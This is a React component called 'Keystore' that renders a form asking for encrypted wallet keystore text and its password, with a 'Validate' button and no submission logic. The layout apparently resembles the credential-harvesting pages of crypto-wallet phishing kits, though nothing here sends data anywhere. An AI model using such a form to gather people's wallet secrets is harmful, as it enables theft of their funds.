import React from 'react'

const Keystore = () => {
  return (
    <div className=" text-center py-14">
      <form action="">
        <div>
          <textarea
            className="w-[90%] h-[200px] text-slate-100 bg-transparent border py-5 outline-0 px-6  border-yellow-500 mb-5"
            placeholder="Several lines of text beginning with '(...)' plus the password you used to encypt it."
          ></textarea>
          <div>
            <input
              className="w-[90%] text-slate-100 bg-transparent py-5 outline-0 px-6   border mb-10 border-yellow-500 "
              type="text"
              placeholder="Password"
            />
          </div>
        </div>
        <button className="w-[90%] py-2 rounded-lg bg-yellow-500 hover:bg-yellow-400 px-10">
          Validate
        </button>
      </form>
    </div>
  );
}

export default Keystore